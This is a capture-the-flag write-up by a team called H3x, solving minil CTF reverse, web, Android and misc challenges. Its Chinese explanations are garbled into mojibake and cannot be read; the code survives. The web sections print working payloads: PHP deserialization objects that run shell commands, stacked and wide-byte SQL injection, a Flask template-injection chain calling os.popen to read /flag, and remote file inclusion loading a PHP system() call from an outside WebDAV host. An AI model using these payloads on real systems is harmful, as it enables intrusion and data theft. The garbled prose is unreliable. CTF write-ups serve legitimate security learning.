# minil ctf wp

## TEAM INFO

### Team

We are **H3x** !

### teammates

cor1e

eqqie 

blackwatch

## REVERSE

### easyre | Author: eqqie

é¢˜ç›®å¾ˆç®€å•ï¼Œä¸ç”¨ç†ä¼šå‰é¢æ··æ·†çš„éƒ¨åˆ†ï¼Œpatchæ‰forå¾ªç¯é‡Œé¢çš„ifï¼Œç„¶åä¸‹æ–­ï¼Œç›´æ¥çœ‹å†…å­˜å°±ä¼šæœ‰flagä¸€ä¸ªä¸€ä¸ªå­—æ¯è¹¦å‡ºæ¥ã€‚

### EPL-Fish | Author: eqqie

è¿™æ˜¯ä¸ªé€†å‘+MISCï¼Œå› ä¸ºåˆä¸­ç»å¸¸ç©æ˜“è¯­è¨€ï¼Œæ‰€ä»¥å¯¹è¿™ä¸ªæ˜“è¯­è¨€å‡ºçš„é¢˜æ¯”è¾ƒæ•æ„Ÿäºæ˜¯æ‹¿äº†ä¸€è¡€ã€‚

é¢˜ç›®æ˜¯ä¸ªæ¨¡æ‹ŸQQçš„ç™»é™†ç•Œé¢ï¼ˆæå¾—æŒºåƒçš„ï¼‰ï¼Œä½†æ˜¯æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æç¤ºä¸€æ ·çš„é”™è¯¯ï¼Œåº”è¯¥æ˜¯å†™æ­»çš„ã€‚è¿™ç§é¢˜åŠ¨æ€è°ƒè¯•å¾ˆéº»çƒ¦...ä½†æ˜¯è°ƒè¯•äº†ä¸€ä¸‹è¿˜æ˜¯æœ‰æ”¶è·ï¼Œçœ‹åˆ°ä¸€ä¸ªç±»ä¼¼é‚®ç®±å’Œå¯†ç çš„ä¸œè¥¿ï¼Œæ˜¯ä¸ª163é‚®ç®±ã€‚äºæ˜¯æˆ‘é©¬ä¸Šæƒ³åˆ°äº†åˆä¸­ç©è¿‡çš„ä¸€ç§ä¸Šå¤ç›—å·æ–¹æ³•ï¼Œå°±æ˜¯æŠŠè¾“å…¥æ¡†çš„å†…å®¹ä½œä¸ºé‚®ä»¶å‘é€ç»™ç›—å·è€…ã€‚

äºæ˜¯æŠ“åŒ…ï¼Œé©¬ä¸Šå°±æŠ“åˆ°äº†é‚®ç®±çš„è´¦å·å’Œå¯†é’¥ï¼Œå»163ç™»å½•äº†ä¸€ä¸‹å‘ç°ç™»ä¸ä¸Šï¼Œæ¨æµ‹è¿™å¯èƒ½ä¸æ˜¯é‚®ç®±å¯†ç ï¼Œè€Œæ˜¯å®‰å…¨ç ï¼Œå¯ä»¥ç”¨äºtelnetç™»å½•smtpå’Œpopå‘é€æ¥æ”¶é‚®ä»¶ã€‚äºæ˜¯telnetç™»ä¸Šå»è¯•è¯•æœçœŸå¯ä»¥å‘é‚®ä»¶ï¼Œç„¶åpopç™»é™†ä¸Šå»ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰å†™é¢˜çš„äººè¾“å…¥çš„å†…å®¹ï¼ˆæ²¡æ³¨æ„çœ‹æœ‰æ²¡æœ‰äºº çœŸçš„è¾“äº†è´¦å·å¯†ç ï¼‰ã€‚

é‚®ä»¶åˆ—è¡¨ä¸­æœ‰ä¸€ä¸ªå¾ˆå¤§çš„é‚®ä»¶ï¼ŒæŠŠå†…å®¹ï¼ˆbase64ç¼–ç è¿‡çš„ï¼‰copyä¸‹æ¥ï¼Œæœ‰ä¸¤éƒ¨åˆ†ï¼Œæ­£æ–‡æç¤ºé™„ä»¶ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶å¯ä»¥å¸®åŠ©è§£é¢˜ã€‚äºæ˜¯python decodeæ‹¿åˆ°é™„ä»¶ï¼Œæ˜¯é¢˜ç›®æºç ã€‚

æœ€åçš„æœ€åæ‰¾äº†ä¸€å¤§åœˆ....flagå±…ç„¶åœ¨æºç çš„æ³¨é‡Šé‡Œé¢ã€‚

## WEB

### P| Author: blackwatch

å‘ç°å°†cookieä¸¤éƒ¨å¤„ç†åä¼ å…¥fileï¼Œå°†cookieé‡Œçš„gitbase64decodeä¸€ä¸‹

`O:5:"gitee":1:{s:4:"file";s:9:"index.php";}`

æ”¹æˆ`O:5:"gitee":1:{s:4:"file";s:11:"classes.php";}`

æœ€åçš„__wakeupé­”æœ¯æ–¹æ³•å¯ä»¥ç”¨phpååºåˆ—åŒ–çš„CVE-2016-7124ç»•è¿‡ã€‚çœ‹githubï¼Œæ˜¯è¦ä¼ å‚cmdæ‰§è¡Œï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œå‘ç°preg_matché‡Œå”¯ç‹¬ä¿ç•™äº†Pï¼Œæ­¤é¢˜é¢˜ç›®ä¹Ÿæ˜¯Pï¼Œæƒ³åˆ°çœ‹è¿‡çš„ä¸€ç¯‡æ–‡ç« ï¼Œåˆ©ç”¨æ‰§è¡Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶tmp/phpXXXXXXï¼ŒåŸæ–‡åœ°å€https://www.anquanke.com/post/id/201136

exp:

```python
import requests
import base64

url =''
git = 'O:6:"github":3:{s:4:"file";s:9:"index.php";s:3:"cmd";s:26:"?><?=`. /??p/p?p??????`;?>";}'#åå¼•å·ä¸è¾“å‡ºï¼Œç”¨<?=ä»£æ›¿<?php echoè¾“å‡º
git = base64.b64encode(git.encode()).decode()
cookies = {'git': git}
files = {'file': '#!/bin/sh\ncat /* | grep minil'}
a = requests.post(url, files=files, cookies=cookies)
print(a.text)
```





### id_wife| Author: blackwatch

å‚ç…§å¼ºç½‘æ¯ éšä¾¿æ³¨ï¼Œå †å æ³¨å…¥å’Œconcatç»•è¿‡ã€‚

è§‚å¯Ÿ1'æŠ¥é”™

`w1nd');`ç»•è¿‡

`w1nd');show tables;`

```
array(1) { [0]=> string(13) "1145141919810" }
array(1) { [0]=> string(4) "user" }
```

`w1nd');set @sql = CONCAT('se','lect * from 1145141919810;');prepare stmt from @sql;execute stmt;#`

strstråŒºåˆ†å¤§å°å†™ç»•è¿‡

`w1nd');Set @sql = CONCAT('se','lect * from 1145141919810;');Prepare stmt from @sql;EXECUTE stmt;#`





### are you reclu3e?| Author: blackwatch

 æ‰«å‡ºæ¥äº† .index.php.swp .login.php.swp

vim -r è¿˜åŸ

```php
login.php
<?php
    include "connection.php";
    mysqli_query($conn, "SET CHARACTER SET 'gbk'");

    $username=addslashes($_POST['username']);
    $password=addslashes($_POST['password']);
    $msg='';
    if(empty($username)){
        $msg='please post your username';
    }
    else{
        $sql="select * from users where username='$username'";
        $result=mysqli_query($conn,$sql);
        if($result){
            $row=mysqli_fetch_array($result,MYSQLI_ASSOC);
        }
        if(empty($row)){
            $msg='you are not reclu3e';
        }
        else{
            if($row['password']!==$password){
                $msg='I know you are reclu3e but you need post the right password';
            }
            else{
                session_start();
                $_SESSION['uid'] = $username;
                echo '<script>alert("Yes! you are reclu3e")</script>';
            }
        }
    }
    if(!empty($msg)){
        echo "<script>alert('$msg')</script>";
    }
    $conn->close();
    echo "<script type='text/javascript'>";  
    echo "window.location.href='index.php'";  
    echo "</script>";  
```

```php
index.php
<?php
    include "flag.php";//$flag="minilctf{****}";
    session_start();
    if (empty($_SESSION['uid'])) {
        include "loginForm.html";
    }
    else{
        echo '<h1>Hello, reclu3e!</h1>';
        $p=unserialize(isset($_GET["p"])?$_GET["p"]:"");
    }
?>
<?php
class person{
    public $name='';
    public $age=0;
    public $weight=0;
    public $height=0;
    private $serialize='';
    public function __wakeup(){
        if(is_numeric($this->serialize)){
            $this->serialize++;
        }
    }
    public function __destruct(){
        @eval('$s="'.$this->serialize.'";');
    }
}
```

loginé€»è¾‘æ˜¯åˆ¤æ–­è¾“å…¥çš„å¯†ç å’Œå–å‡ºçš„usrå¯¹åº”çš„å¯†ç æ¯”è¾ƒï¼Œæ’è¡¨ï¼ŒGBK+addslashes å®½å­—èŠ‚æ³¨å…¥

`username=reclu3e%df%27%20union%20select%201,2%23&password=2`

phpååºåˆ—åŒ–æ¼æ´ï¼Œprivateå˜é‡åå‰åè¦ç”¨%00

`@eval('$s="'.$this->serialize.'";');`ç”¨";é—­åˆå‰å

```
/index.php?p= O:6:"person":5:{s:4:"name";s:0:"";s:3:"age";i:0;s:6:"weight";i:0;s:6:"height";i:0;s:17:"%00person%00serialize";s:30:"";highlight_file("flag.php");"";}
```





### Let's_Play_Dolls| Author: blackwatch

çœ‹åˆ°foo1 foo2 foo3ï¼Œæƒ³èµ·æ¥å‰æ®µæ—¶é—´é‡åˆ°çš„ä¸€ä¸ªé¢˜ï¼Œphpååºåˆ—åŒ–ä¸­çš„POPé“¾æ„é€ ï¼Œç°å­¦äº†ä¸€ä¼šã€‚

foo3->foo2->foo1ï¼Œfoo1é‡Œè¿˜éœ€è¦ç»•è¿‡ä¸€æ¬¡wakeupã€‚

ç­‰ä¸‹foo1é‡Œè¿™æ˜¯å•¥ï¼Ÿ

`preg_replace('/[^\W]+\((?R)?\)/', '', $this->var)`

æŸ¥äº†ä¸€ä¸‹`?R`ï¼ŒPHP manualä¸­è¿™æ ·è¯´ï¼š

**â€é¦–å…ˆï¼Œå®ƒåŒ¹é…ä¸€ä¸ªå·¦æ‹¬å·ã€‚ ç„¶åå®ƒåŒ¹é…ä»»æ„æ•°é‡çš„éæ‹¬å·å­—ç¬¦åºåˆ—æˆ–ä¸€ä¸ªæ¨¡å¼è‡ªèº«çš„é€’å½’åŒ¹é…(æ¯”å¦‚ï¼Œ ä¸€ä¸ªæ­£ç¡®çš„æ‹¬å·å­ä¸²)ï¼Œæœ€ç»ˆï¼ŒåŒ¹é…ä¸€ä¸ªå³æ‹¬å·ã€‚â€œ**

å¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­`XXXX(XXXX(XXXX()))`

```
\Wç­‰ä»·äº[^A-Za-z0-9_]
+æ‹¬å·åŒ¹é…\( ...... \)
+æ‹¬å·ä¸­é—´æ˜¯XXXX(XXXX(XXXX()))
```

æŸ¥åˆ°ä¸€ä¸ªpayload   `readfile(end(scandir(getcwd())))`

```
O:4:"foo3":1:{s:3:"var";O:4:"foo2":2:{s:3:"var";s:2:"hi";s:3:"obj";O:4:"foo1":2:{s:3:"var";"readfile(end(scandir(getcwd())));;}}}
```

ï¼ˆè¿™é‡Œæœ‰ä¸ªå°å‘ï¼Œfile_exists()ç›´æ¥å°†è¾“å…¥å½“æˆå­—ç¬¦ä¸²å¯¹å¾…ï¼Œå°±ç›´æ¥æ‰§è¡Œäº†foo2é‡Œçš„__toString()ï¼Œï¼ˆæˆ‘ä¸€å¼€å§‹ä»¥ä¸ºè¦ç”¨echoï¼Œå¡äº†åŠå¤©ï¼‰ä¸çŸ¥é“æ˜¯å‡ºé¢˜äººæœ‰æ„ä¸ºä¹‹è¿˜æ˜¯æ€ä¹ˆæ ·ã€‚

 

### Personal_IP_Query| Author: blackwatch

burpåŠ XFFå¤´å‘ç°æ³¨å…¥ç‚¹ï¼Œè§‚å¯Ÿhttp response å‘ç°ç”¨äº† gunicornï¼Œåº”è¯¥æ˜¯python flaskçš„æ¨¡æ¿æ³¨å…¥

å°è¯• {{1+1}}ç¡®è®¤æ˜¯SSTIï¼Œæ€»çš„æ¥è¯´å°±æ˜¯å„ç§ç»§æ‰¿ç›´åˆ°os.popen

æœ‰è¿‡æ»¤ï¼Œä¸€ç‚¹ç‚¹å°è¯•å‘ç°æ˜¯è¿‡æ»¤äº†_ä¸‹åˆ’çº¿ï¼ŒæŸ¥äº†ä¸€ä¸‹å¯ä»¥ç”¨request.argsè·å–getå‚æ•°ç»•è¿‡

```
http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=__class__&mro=__mro__&subclasses=__subclasses__&init=__init__&globals=__globals__&popen=popen&cmd=cat /flag

X-Forwarded-For: {{ ()[request.args.class][request.args.mro][-1][request.args.subclasses]()[127][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read() }}
```



### include| Author: blackwatch

#ç”±äºæ‹¿äº†ç­¾åˆ°é¢˜çš„ä¸€è¡€è§¦å‘**äººç±»æ¼æ´**ï¼ˆæœç„¶äººæ‰æ˜¯æœ€å¤§çš„æ¼æ´ï¼Œè¯¦æƒ…å’¨è¯¢frkï¼‰ï¼Œæ‹¿åˆ°äº†ä¸¤ä¸ªhint **webdav**å’Œ#**smb**        å‚è€ƒé“¾æ¥https://www.anquanke.com/post/id/201060

ä¸€å¼€å§‹å°±æ‰å‘é‡Œå»äº†ï¼Œè¢«ä¸¤å¤„`<?php ?>`åŒ…å«èµ·æ¥çš„ä»£ç ä¸èƒ½äº’ç›¸è°ƒç”¨ï¼Œäºæ˜¯adminå°±æ˜¯ç©ºå€¼ï¼Œç©ºå€¼çš„ååºåˆ—åŒ–æ˜¯ä»€ä¹ˆå‘¢ï¼Œè‡ªå·±å†™äº†ä¸ªphpè¯•äº†ä¸‹ï¼š

```
s:0:"";
```

æ„é€ å¥½ä¹‹åè¿”å›äº†`TE9PS0hFUkU=.html`ï¼Œç›´æ¥è®¿é—®ä¼šé‡å®šå‘åˆ°ç™¾åº¦ï¼Œburp repeaterè®¿é—®å¾—åˆ°ä¸€ä¸²base64

è§£ç ä¹‹åæç¤ºè®¿é—®f1na1.phpï¼Œæœ‰ä¸ªseehintç‚¹è¿›å»urlæ˜¯/f1na1.php?file=hint.php

ä¼°è®¡æ˜¯æ–‡ä»¶åŒ…å«ï¼Œåˆšæ‰çš„http responseé‡Œçœ‹åˆ°äº†IISï¼Œå°±æƒ³èµ·äº†äº†winä¸‹åŒºåˆ†å¤§å°å†™ï¼Œç”¨hint.PHPè¯•äº†ä¸‹ï¼ŒæˆåŠŸäº†ï¼Œè¿™åœ°æ–¹ä¼°è®¡è¿‡æ»¤äº†å¾ˆå¤šåè®®ï¼Œæ­¤æ—¶å°±ç”¨åˆ°äº†webdavï¼Œç™¾åº¦äº†ä¸€ä¸ªåˆ©ç”¨æ–¹æ³•https://paper.seebug.org/1148/ï¼Œä¸€æ‰“å°±å‡ºæ¥äº†

```
f1na1.php?file=//xxx.xxx.xxx.xxx//webdav/a.txt
```

```
a.txt
<?php system('dir');?>
```

å›æ˜¾é‡Œæœ‰ä¸€ä¸ªZmxhZ2ZsQGcxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjM.txtï¼Œç›´æ¥è®¿é—®å¾—åˆ°flag





### ç­¾ åˆ° é¢˜| Author: blackwatch

ls /çœ‹åˆ°äº†flag å’Œreadflagï¼Œç„¶åçœ‹äº†å¯ç”¨çš„bashï¼Œæœ‰shå’Œashï¼Œä¸çŸ¥é“ashæœ‰ä»€ä¹ˆç”¨ï¼Œ

/readflagè¿”å›`do you want the flag?` ï¼Œåæ¥ğŸ§è¯´frkå–œæ¬¢è€ƒå¯Ÿlinuxï¼Œæˆ–è®¸æ˜¯äº¤äº’å›å¤ä¸€ä¸ªyes?æ‰¾äº†ä¸€ä¸‹å¯ä»¥äº¤äº’çš„å‡½æ•°ï¼Œæ‰¾åˆ°äº†**proc_open**ï¼ŒæŸ¥äº†ä¸‹å‡½æ•°çš„ç”¨æ³•ï¼Œä¸€å¼€å§‹ç”¨Yesæ²¡ç”¨ï¼Œè¯•äº†ä¸‹yæœ‰å›æ˜¾ï¼Œåˆ°æœ€åå‡ºæ¥ä¸€ä¸ªå¼å­ï¼Œä¸çŸ¥é“å¯ä¸å¯ä»¥ç”¨æ­£åˆ™ï¼Œåˆ·æ–°äº†ä¸€ä¸‹å‘ç°æœ‰é‡å¤çš„ç®—å¼ï¼Œå°±è·‘ä¸ªå¾ªç¯å§ï¼Œæ„é€ å¦‚ä¸‹expï¼Œæ ¸å¿ƒæ˜¯`y\ny\n120\n`

```python
import requests
import time
url = ''
url += '?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\ny\n120\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27'

while 1:
    r = requests.get(url)
    print(r.text)
    if 'minil' in r.text:
        break
    time.sleep(1)#ä¸ç”¨å»¶æ—¶çš„è¯ä¸€ç›´éƒ½æ˜¯dockerå‡†å¤‡çŠ¶æ€ ):
```



## ANDROID

å®‰å“é¢˜è¦æ˜¯çº¯è€ƒé€†å‘è¿˜è¡Œï¼Œè¦æ˜¯è€ƒåˆ°å„ç§åº•å±‚åŸç†æˆ‘å°±è’™è”½äº†...æ¯•ç«Ÿåä¼šé‡Œé¢androidé€†å‘æ–¹é¢éƒ½æ˜¯ç”¨çˆ±å‘ç”µï¼Œå¾—é è‡ªå·±é’»ç ”ã€‚

### TestOnly | Author: eqqie

#### åˆ†æ

æ˜¯ä¸ªjavaé€†å‘ï¼Œé€»è¾‘ä¹Ÿå¾ˆå¾ˆç®€å•ï¼Œå°±æ˜¯ä¸¤ä¸ªå‡½æ•°åšäº†äº›å¼‚æˆ–ä¹‹ç±»çš„åŠ å¯†ï¼ŒæŠŠé€»è¾‘é€†è¿‡æ¥å†™è„šæœ¬å°±è¡Œäº†ï¼Œè¿™é‡Œåªæœ‰ä¸ªå†™çš„å¾ˆä»“ä¿ƒçš„è„šæœ¬

#### exp

```python
import hashlib

en_flag = b"U_\005SK`^\x00\021=fWP{\004iUSem7U\0270j\001(\007a\037"
table = b"B08020D0FACFDAF81DB46890E4040EDBB8613DA5ABF038F8B86BD44525D2E27B26E22ACD06388112D8467FD688C79CC7EA83F27440577350E8168C2560368616"
result = ""

hash_table = hashlib.sha1(table).digest()
print(hash_table)
de_table = b""

for i in range(len(hash_table)):
    bi = hash_table[i] & 0xFF
    if(bi<16):
        de_table += b"00"
    else:
        de_table += hex(bi).replace("0x","").ljust(2,"0").encode()
        print(hex(bi).replace("0x","").ljust(2,"0"),end="|")

print(de_table)

for i in range(30):
    bi = chr(en_flag[i] ^ (de_table[i] & 0XFF))
    print(bi,end=".")
    result += bi

print(result.replace("flag","minil"))
```



### Khronos | Author: eqqie

#### åˆ†æ

è¿™é¢˜æŒºæœ‰æ„æ€ï¼Œé€†å‘ä¹‹åå‘ç°é€»è¾‘åœ¨Cå†™çš„libé‡Œé¢ï¼Œåˆå˜æˆäº†Cé€†å‘ã€‚

IDAé‡Œé¢æ‰“å¼€libæ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œç»“æœå‘ç°å¯¹flagçš„ä¸­é—´è¿›è¡Œäº†ä¸€å¤§ä¸²ä¹±ä¸ƒå…«ç³Ÿçš„åŠ å¯†ï¼ŒåŠ å¯†å‡½æ•°æ˜¯ä¸¤ä¸ªä¸¤ä¸ªå­—ç¬¦åˆ†ç»„è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œåè¿”å›ç»“æœçš„æœ€ä½ä½å­—èŠ‚ã€‚å¯¹è¾“å…¥å†…å®¹è¿›è¡ŒåŠ å¯†åä¸å‡ ä¸ªå¸¸æ•°ä½œæ¯”è¾ƒï¼Œç„¶åä¼°è®¡æ˜¯å­˜åœ¨å¾ˆå¤šç›¸åŒè§£ï¼Œäºæ˜¯åˆè¿›è¡Œäº†ä¸€æ¬¡å“ˆå¸Œæ¥éªŒè¯æ˜¯å¦ä¸ºçœŸçš„flagã€‚

è¿™æ ·çš„é¢˜åªèƒ½é‡å»ºåŠ å¯†é€»è¾‘ï¼Œç„¶å26*26ä¸ªå­—æ¯ç»„åˆå»éå†åŠ å¯†ï¼Œç„¶åå’Œå¸¸æ•°åšå¯¹æ¯”ï¼Œæœ€åç­›é€‰å‡ºäº†è¿™ä¹ˆä¸€äº›ç»„åˆï¼š

```python
['FJ', 'Kh', 'L5', 'TU', 'Wu', 'Z6', 'aK', 'eS', 'pp', '76', '03'] 11
['J!', 'R0', 'aA', 'gp', 'id', 'pA', 'wk', 'xY', 'xp', 'yF', 'yT', 'ym'] 12
['C5', 'D0', 'P7', 'R3', 'fx', 'iu', 'kX', 'mB', 'mk', 'nO', 'oT', 'pP', 'wG', 'yA', 'zN'] 15
['A3', 'K9', 'O7', 'Y0', 'dE', 'jn', 'lb', 'sr', 's_', 'tg', 'wW', '59'] 12
['EO', 'JT', 'La', 'MC', 'OS', 'Oz', 'Sq', 'Tr', 'ZM', 'a4', 'p2', '1S', '2Z', '3C', '4V', '6F', '6V', '7d', '0L', 
'!Z', '_u'] 21
['FZ', 'IS', 'Jc', 'Qk', 'Zn', 'mf', 't0', 'z6', '4c', '94', '!T', '#3', '_m'] 13
['JU', 'Lf', 'Sv', 'S_', 'Tc', 'Ux', 'Ze', 'a5', 'a7', 'p3', 'r#', 'w4', '1R', '4S', '6G', '0O', '!O', '!f', '!r'] 
19
['H2', 'cV', 'ew', 'fC', 'lv', 'rm', 'sp', 'te', 'uA', 'uG', 'vg', 'wU', 'wh', 'zw', '#8'] 15
['BB', 'BF', 'DX', 'RO', 'Rb', 'R_', 'UJ', 'da', 'en', 'fJ', 'gU', 'iC', 'qk', 'sD', 'tx', 'vC', 'vG', 'vW', 'vz', 
'xA', 'xU', '6u', '69', '7S', '9U', '@y'] 26
['CR', 'HC', 'Kc', 'MT', 'M@', 'M}', 'Rm', 'XL', 'ZL', 'Zc', 'c#', '1y', '3o', '0M', '0f', '0v', '!p', '_Y'] 18
    
['C@', 'Dj', 'Fh', 'Gq', 'Gu', 'Hn', 'Po', 'Q_', 'Ri', 'Sr', 'VJ', 'c3', 'd2', 'm5', 'y4', '8E', '_t'] 17
['Co', 'Is', 'KZ', 'Ka', 'Lt', 'MB', 'MR', 'Nf', 'TJ', 'UE', 'YU', 'e9', 'f6', 'h$', '1D', '1k', '1m', '3F', '6n', 
'7X', '0d', '!I'] 22
['AX', 'Aq', 'Cs', 'ED', 'E}', 'Fd', 'M9', 'PZ', 'TV', 'To', 'Ut', 'X7', 'Zm', 'aX', 'n$', 'pN', 'ps', 'rq', 'wf', 
'wv', '1g', '1s', '7@', '8t', '9o'] 25
```

é¢˜ç›®ä¸­é—´ç»™äº†ä¸ªhintï¼Œè¯´flagæ˜¯æœ‰è¯­ä¹‰çš„ï¼Œç»“åˆé¢˜ç›®å‡ºç°è¿‡çš„å†…å®¹ï¼Œä»å¤‡é€‰çš„ç»„åˆä¸­æ‹¼å‡ºäº†ä¸ªå¤´å’Œå°¾éƒ¨ï¼ˆç®€ç›´è€ƒéªŒçœ¼åŠ›ï¼‰ï¼Œç„¶åå‰©ä¸‹å››ä½å˜é‡ç”¨pythonè·‘ä¸€è·‘å°±å‡ºæ¥äº†ã€‚

#### exp

```python
import os, sys
flag_len = 32

table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@$_}"

flag_en = b"\xf1\x00\x00\x00\xb7"
flag_en += b"\x01\x00\x00\x20\x05"
flag_en += b""


def encode(num: int):
    v1 = 0
    v3 = 0
    v4 = 0
    v5 = 0
    v6 = 0
    v7 = 0
    v8 = 0
    v9 = 0
    v10 = 0
    v11 = 0
    v12 = 0
    v13 = 0
    v14 = 0
    v15 = 0
    v16 = 0
    v17 = 0
    v18 = 0
    v19 = 0
    v20 = 0
    v21 = 0
    v22 = 0
    v23 = 0
    v24 = 0
    v25 = 0
    v26 = 0
    v27 = 0
    v28 = 0
    v29 = 0
    v30 = 0
    v31 = 0
    v32 = 0
    v33 = 0
    v34 = 0
    v35 = 0
    v36 = 0
    v37 = 0
    v38 = 0
    v39 = 0
    v41 = 0
    v42 = 0
    input_1 = num

    while True:
        v41 = v3
        v42 = v1
        v5 = (input_1 & 0x88880C92)
        v6 = 0
        if input_1 & 0x88880C92:
            v6 = 0
            while True:
                v6 ^= v5 & 1
                v5 >>= 1
                if not v5:
                    break
        v7 = v6 ^ 2*input_1
        v8 = 0
        v10 = (v7 & 0x88880C92)
        v9 = 1 if ((v7 & 0x88880C92) == 0) else 0
        v11 = 2*v7
        v12 = 0
        if not v9:
            v12 = 0
            while True:
                v12 ^= v10 & 1
                v10 >>= 1
                if not v10:
                    break
        v13 = v12 ^ v11
        v14 = v12 ^ 2 * v6
        v15 = (v13 & 0x88880C92)
        if v13 & 0x88880C92:
            v8 = 0
            while True:
                v8 ^= v15 & 1
                v15 >>= 1
                if not v15:
                    break
        v16 = v8 ^ 2*v13
        v17 = v8 ^ 2*v14
        v18 = 0
        v19 = (v16 & 0x88880C92)
        v9 = 1 if ((v16 & 0x88880C92) == 0) else 0
        v20 = 2*v16
        v21 = 0
        if not v9:
            v21 = 0
            while True:
                v21 ^= v19 & 1
                v19 >>= 1
                if not v19:
                    break
        v22 = v21 ^ v20
        v23 = v21 ^ 2*v17
        v24 = (v22 & 0x88880C92)
        v9 = 1 if (v22 & 0x88880C92) == 0 else 0
        v25 = 2*v22
        if not v9:
            v18 = 0
            while True:
                v18 ^= v24 & 1
                v24 >>= 1
                if not v24:
                    break
        v26 = v18 ^ v25
        v27 = v18 ^ 2*v23
        v28 = 0
        v29 = (v26 & 0x88880C92)
        v9 = 1 if ((v26 & 0x88880C92) == 0) else 0
        v30 = 2*v26
        v31 = 0
        if not v9:
            v31 = 0
            while True:
                v31 ^= v29 & 1
                v29 >>= 1
                if not v29:
                    break
        v32 = v31 ^ v30
        v33 = v31 ^ 2 * v27
        v34 = (v32 & 0x88880C92)
        v9 = 1 if ((v32 & 0x88880C92) == 0) else 0
        v35 = 2 * v32
        if not v9:
            v28 = 0
            while True:
                v28 ^= v34 & 1
                v34 >>= 1
                if not v34:
                    break
        v36 = v28 ^ v35
        v37 = v28 ^ 2 * v33
        v38 = (v36 & 0x88880C92)
        v39 = 2 * v36
        if v36 & 0x88880C92:
            v4 = 0
            while True:
                v4 ^= v38 & 1
                v38 >>= 1
                if not v38:
                    break
        else:
            v4 = 0
        input_1 = v4 ^ v39
        v3 = ((v4 ^ 2*v37)+2*(v41))
        v1 = v42 + 1
        if not (v42 != 31):
            break
    return ((v4 ^ 2*v37)+2*(v41))&0xFF

total = []
def test(b:int):
    global total
    f = open("khronos","a+")
    result_array = []
    for i in table:
        for j in table:
            result = encode(((i << 8)+j)&0xFFFFFFFF)
            if result == b:
                result_array.append(chr(i)+chr(j))
                f.write(chr(i)+chr(j)+"\n")
                print(chr(i), chr(j))
                f.write("input:"+str((i << 8)+j)+"\n")
                print("input:", (i << 8)+j)
                f.write(hex(result)+"\n")
                print(hex(result))
    f.write("--------------------------------\n")
    f.close()
    total.append(result_array)               

test(0xF1)
test(0xB7)
test(0x1A)
test(0x52)
test(0x6B)
test(0x49)
test(0x76)
test(0x02)
test(0xC1)
test(0xD6)
test(0x4E)
test(0xB6)
test(0xE0)


c = ['JU', 'Lf', 'Sv', 'S_', 'Tc', 'Ux', 'Ze', 'a5', 'a7', 'p3', 'w4', '1R', '4S', '6G', '0O'] 
d = ['H2', 'cV', 'ew', 'fC', 'lv', 'rm', 'sp', 'te', 'uA', 'uG', 'vg', 'wU', 'wh', 'zw'] 
e = ['BB', 'BF', 'DX', 'RO', 'Rb', 'R_', 'UJ', 'da', 'en', 'fJ', 'gU', 'iC', 'qk', 'sD', 'tx', 'vC', 'vG', 'vW', 'vz', 'xA', 'xU', '6u', '69', '7S', '9U', '@y'] 
f = ['CR', 'HC', 'Kc', 'MT', 'M@', 'M}', 'Rm', 'XL', 'ZL', 'Zc', '1y', '3o', '0M', '0f', '0v', '_Y'] 


front = "minil{KhR0nOs_1S_m"  
end = "_t1mE}"
#minil{KhR0nOs_1S_m4SteR_0f_t1mE}
def check(flag):
    v8 = 0
    for ch in flag:
        v8 = 1331*v8 + ord(ch)
    if (((v8 & 0x7FFFFFFF)==0x7304BF7A) | 2) == 3:
        print("getflag:",flag)
        sys.exit(0)


for c1 in c:
    for d1 in d:
        for e1 in e:
            for f1 in f:
                flag_tmp = front+c1+d1+e1+f1+end
                print(flag_tmp)
                check(flag_tmp)
```



## MISC

### MiniGameHacking | Author: eqqie

é€åˆ†miscï¼Œu3då†™çš„æ¸¸æˆï¼Œåˆ æ‰ç›®å½•ä¸‹é‚£ä¸ªç–‘ä¼¼ä¿æŠ¤ç¨‹åºçš„ä¸œè¥¿ï¼Œç”¨CEæ¥æ”¹æ•Œäººç”Ÿå‘½å€¼ä¸º0å¹¶é”å®šï¼Œä¸€ç›´æ”¾æ‹›å°±è¿‡å…³äº†ã€‚

### EasyVmem | Author: eqqie

å•Šè¿™é¢˜è€æ—©å°±åšåˆ°æœ€åä¸€æ­¥äº†ï¼Œä½†æ˜¯å»æŠ½æ—¶é—´å†™äº†pwnï¼Œä¸¢æ‰äº†ä¸€è¡€ã€‚

#### åˆ†æ

volatilityåˆ†æå†…å­˜é•œåƒï¼Œå…ˆæŸ¥çœ‹å‰ªåˆ‡æ¿ï¼Œæœ‰ä¸ªä¸å®Œæ•´çš„base64ï¼Œè§£å—ä¹‹åæ˜¯è¯´è¦stringæŸ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»“æœæŸ¥äº†ä¹‹ååªæ˜¯æç¤ºæ¸¸æˆå¼€å§‹ï¼Œæ²¡å•¥åµç”¨....

æŸ¥çœ‹è¿›ç¨‹ï¼Œé©¬ä¸Šçœ‹åˆ°ä¸€ä¸ªä¼ªé€ çš„explorerï¼Œå¯¼å‡ºæ¥é€†å‘ï¼Œè¾“å…¥å¯†ç å¾—åˆ°ä¸€ä¸ªhintï¼Œè¯´è®°äº‹æœ¬æœ‰ä¸€ä¸ªsecret...

